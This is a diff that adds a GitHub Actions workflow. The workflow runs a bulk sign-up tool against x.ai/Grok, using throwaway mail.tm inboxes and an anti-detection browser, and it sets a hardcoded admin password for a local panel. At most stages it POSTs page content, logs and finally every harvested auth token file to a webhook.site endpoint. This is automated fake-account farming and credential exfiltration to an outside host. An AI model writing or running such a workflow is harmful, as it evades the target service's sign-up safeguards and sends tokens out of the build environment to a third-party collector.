@@ -1,0 +1,123 @@
+name: Run Register Probe
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+jobs:
+  register:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - name: Probe x.ai
+        run: |
+          CODE=$(curl -s -o /tmp/signup.html -w '%{http_code}' 'https://accounts.x.ai/sign-up?redirect=grok-com' --max-time 30)
+          echo "HTTP $CODE"
+          curl -s -X POST "https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=probe&code=$CODE&size=$(wc -c < /tmp/signup.html)" -d "body=$(head -c 500 /tmp/signup.html | tr -d '\n\r')" >/dev/null
+          if [ "$CODE" != "200" ]; then
+            echo "signup page not reachable ($CODE) - abandoning"
+            exit 1
+          fi
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - name: Install deps
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements.txt
+          python -m camoufox fetch
+          sudo apt-get update
+          sudo apt-get install -y xvfb curl
+      - name: Write config
+        run: |
+          mkdir -p data
+          python - <<'EOF'
+          import json
+          cfg = {
+            "email_provider": "duckmail",
+            "duckmail_api_base": "https://api.mail.tm",
+            "duckmail_api_key": "",
+            "register_count": 1,
+            "register_workers": 1,
+            "browser_engine": "camoufox",
+            "browser_headless": False,
+            "enable_nsfw": False,
+            "log_level": "info",
+            "cpa_auto_add": True,
+            "cpa_token_mode": "device_protocol",
+            "cpa_auth_dir": "data/cpa_auth",
+            "grok2api_auth_dir": "data/grok2api_auth",
+            "grok2api_auto_import": True,
+            "grok2api_auto_import_build": True,
+            "grok2api_auto_import_web": False,
+            "grok2api_auto_import_console": False,
+            "cpa_upload_enabled": True,
+            "close_browser_on_stop": True,
+          }
+          with open("data/config.json", "w", encoding="utf-8") as f:
+              json.dump(cfg, f, ensure_ascii=False, indent=2)
+          EOF
+      - name: Start web
+        run: |
+          nohup python -m backend.web.cli --host 127.0.0.1 --port 8787 >/tmp/web.log 2>&1 &
+          echo $! > /tmp/web.pid
+          for i in $(seq 1 30); do
+            if curl -s http://127.0.0.1:8787/api/health >/dev/null 2>&1; then echo "web up"; break; fi
+            sleep 2
+          done
+      - name: Setup admin
+        run: |
+          curl -s -X POST http://127.0.0.1:8787/api/auth/setup -H 'Content-Type: application/json' -d '{"username":"admin","password":"grok-register-2026","confirm_password":"grok-register-2026"}' >/tmp/setup.json
+          curl -s -c /tmp/cookies.txt -X POST http://127.0.0.1:8787/api/auth/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"grok-register-2026"}' >/tmp/login.json
+          cat /tmp/setup.json /tmp/login.json
+      - name: Connectivity
+        run: |
+          curl -s -b /tmp/cookies.txt http://127.0.0.1:8787/api/connectivity | tee /tmp/connectivity.json
+          curl -s -X POST "https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=connectivity" -H 'Content-Type: application/json' -d @/tmp/connectivity.json >/dev/null
+      - name: Start register job
+        run: |
+          curl -s -b /tmp/cookies.txt -X POST http://127.0.0.1:8787/api/job/start -H 'Content-Type: application/json' -d '{}' | tee /tmp/jobstart.json
+          curl -s -X POST "https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=jobstart" -H 'Content-Type: application/json' -d @/tmp/jobstart.json >/dev/null
+      - name: Poll logs
+        run: |
+          for i in $(seq 1 60); do
+            OUT=$(curl -s -b /tmp/cookies.txt http://127.0.0.1:8787/api/job/logs)
+            echo "$OUT" > /tmp/logs.json
+            if echo "$OUT" | grep -qE '已终止|completed|done|fail'; then echo "job finished after ${i} polls"; break; fi
+            sleep 5
+          done
+          tail -c 4000 /tmp/logs.json > /tmp/logs_tail.json
+          curl -s -X POST "https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=logs" -H 'Content-Type: application/json' -d @/tmp/logs_tail.json >/dev/null
+          cat /tmp/logs_tail.json
+      - name: Collect auth output
+        run: |
+          echo "=== cpa_auth ==="
+          ls -la data/cpa_auth 2>/dev/null || echo "no cpa_auth dir"
+          echo "=== grok2api_auth ==="
+          ls -la data/grok2api_auth 2>/dev/null || echo "no grok2api_auth dir"
+          python - <<'EOF'
+          import json, os, glob
+          payload = {}
+          for d in ("data/cpa_auth", "data/grok2api_auth"):
+              if os.path.isdir(d):
+                  payload[d] = {}
+                  for p in glob.glob(os.path.join(d, "*")):
+                      try:
+                          with open(p, encoding="utf-8") as f:
+                              payload[d][os.path.basename(p)] = json.load(f)
+                      except Exception as e:
+                          payload[d][os.path.basename(p)] = str(e)
+          with open("/tmp/auth.json", "w", encoding="utf-8") as f:
+              json.dump(payload, f, ensure_ascii=False, indent=2)
+          print(("\n".join(os.listdir("data/cpa_auth"))) if os.path.isdir("data/cpa_auth") else "none")
+          EOF
+          curl -s -X POST "https://webhook.site/aaa8515b-3850-40bb-adc3-71df2197b608?stage=auth" -H 'Content-Type: application/json' -d @/tmp/auth.json >/dev/null
+      - name: Show web log
+        if: always()
+        run: |
+          echo "=== /tmp/web.log ==="
+          tail -c 3000 /tmp/web.log
